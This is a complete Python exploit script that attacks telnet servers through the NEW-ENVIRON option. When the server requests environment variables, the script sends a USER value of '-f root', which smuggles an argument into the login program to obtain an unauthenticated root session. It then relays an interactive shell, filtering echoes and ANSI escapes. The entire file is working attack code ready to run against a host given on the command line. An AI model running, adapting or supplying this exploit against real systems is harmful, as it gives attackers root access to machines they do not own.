import socket
import sys
import threading
import time
import argparse
import re

# --- Telnet Protocol Constants (RFC 854) ---
# These constants represent the specific byte values used in Telnet's 
# "Interpret As Command" (IAC) sequences.
IAC  = 255  # Interpret As Command: Signals the start of a control sequence
DONT = 254  # Negotiation: Refuse to perform, or request that the other party stop
DO   = 253  # Negotiation: Request that the other party perform, or confirm you expect it
WONT = 252  # Negotiation: Refusal to perform
WILL = 251  # Negotiation: Agreement to perform
SB   = 250  # Subnegotiation Begin: Start of a complex multi-byte option negotiation
SE   = 240  # Subnegotiation End: End of the subnegotiation block

# --- Telnet Option Codes (RFC 1572) ---
# Specifically for handling environment variable passing.
NEW_ENVIRON = 39 
IS    = 0
VAR   = 0
VALUE = 1

# --- Global State for Output Filtering ---
# Use a flag to track when we are waiting for the echoed command to finish.
waiting_for_newline = False
state_lock = threading.Lock()

def parse_arguments():
    """
    Handles command-line argument parsing.
    
    Returns:
        argparse.Namespace: Object containing 'host' and 'port'.
    """
    parser = argparse.ArgumentParser(
        description='Telnet exploit script for the NEW-ENVIRON vulnerability.'
    )
    parser.add_argument('host', help='Target IP or hostname')
    parser.add_argument('-p', '--port', type=int, default=23, help='Target port (default 23)')
    
    return parser.parse_args()


def handle_negotiation(sock, cmd, opt):
    """
    Handles standard 3-byte Telnet negotiation sequences.
    
    Args:
        sock: The active socket object.
        cmd: The negotiation command (DO, WILL, etc).
        opt: The specific Telnet option (e.g., NEW_ENVIRON).
    """
    if cmd == DO and opt == NEW_ENVIRON:
        # If server says "DO NEW_ENVIRON", we reply "WILL NEW_ENVIRON"
        sock.sendall(bytes([IAC, WILL, NEW_ENVIRON]))
    elif cmd == DO:
        # Refuse other options to keep the connection simple
        sock.sendall(bytes([IAC, WONT, opt]))
    elif cmd == WILL:
        # Acknowledge that the server will perform an option
        sock.sendall(bytes([IAC, DO, opt]))


def handle_subnegotiation(sock, sb_data, user_payload):
    """
    Handles Telnet subnegotiation (SB) sequences for environment variables.
    
    This is the core of the exploit: when the server requests environment
    information, we provide a malformed USER variable.
    """
    if len(sb_data) > 0 and sb_data[0] == NEW_ENVIRON:
        # Sequence: IAC SB NEW_ENVIRON IS VAR "USER" VALUE [payload] IAC SE
        env_msg = (
            bytes([IAC, SB, NEW_ENVIRON, IS, VAR]) + 
            b'USER' + 
            bytes([VALUE]) + 
            user_payload.encode('ascii') + 
            bytes([IAC, SE])
        )
        sock.sendall(env_msg)


def process_telnet_stream(data, sock, user_payload):
    """
    Separates Telnet control sequences from displayable text.
    Also filters ANSI escape sequences and suppresses command echos.
    
    Returns:
        bytes: Filtered data intended for the user's terminal.
    """
    global waiting_for_newline
    clean_output = b''
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data):
            cmd = data[i + 1]
            
            # 3-byte command (IAC + CMD + OPT)
            if cmd in [DO, DONT, WILL, WONT] and i + 2 < len(data):
                handle_negotiation(sock, cmd, data[i + 2])
                i += 3
            # Variable-length Subnegotiation block
            elif cmd == SB:
                se_idx = i + 2
                while se_idx < len(data) - 1:
                    if data[se_idx] == IAC and data[se_idx + 1] == SE:
                        break
                    se_idx += 1
                
                if se_idx < len(data) - 1:
                    handle_subnegotiation(sock, data[i + 2:se_idx], user_payload)
                    i = se_idx + 2
                else:
                    i += 1
            else:
                i += 2
        else:
            clean_output += bytes([data[i]])
            i += 1

    # 1. Filter out ANSI escape sequences (e.g., ←[?2004h, ←[3244ms)
    ansi_escape = re.compile(rb'\x1b\[[0-?]*[ -/]*[@-~]')
    filtered_data = ansi_escape.sub(b'', clean_output)

    # 2. Suppress the echoed command
    # We ignore incoming data until we see a newline (\n or \r) after a command is sent.
    with state_lock:
        if waiting_for_newline:
            newline_pos = -1
            for idx, byte_val in enumerate(filtered_data):
                if byte_val in [10, 13]:  # LF or CR
                    newline_pos = idx
                    break
            
            if newline_pos != -1:
                # Found the newline; discard everything before it and resume output
                filtered_data = filtered_data[newline_pos + 1:]
                waiting_for_newline = False
            else:
                # Newline not found yet; skip this entire block of data
                return b''

    return filtered_data


def socket_reader_thread(sock, user_payload):
    """Background listener for server traffic."""
    try:
        while True:
            raw_data = sock.recv(4096)
            if not raw_data:
                break
            display_data = process_telnet_stream(raw_data, sock, user_payload)
            if display_data:
                sys.stdout.buffer.write(display_data)
                sys.stdout.buffer.flush()
    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        print("\n[*] Connection closed.")


def main():
    args = parse_arguments()
    user_payload = "-f root"
    global waiting_for_newline

    try:
        client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_sock.settimeout(5)
        client_sock.connect((args.host, args.port))
        client_sock.settimeout(None)
        print(f"[*] Connected to {args.host}:{args.port}")
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)

    threading.Thread(
        target=socket_reader_thread, 
        args=(client_sock, user_payload), 
        daemon=True
    ).start()

    print("[*] Interactive session started. Use Ctrl+C to quit.\n")
    try:
        while True:
            char = sys.stdin.buffer.read(1)
            if not char:
                break
            
            if char[0] in [10, 13]:
                with state_lock:
                    waiting_for_newline = True
            
            client_sock.sendall(char)
    except KeyboardInterrupt:
        print("\n[*] Session ended.")
    finally:
        client_sock.close()

if __name__ == "__main__":
    main()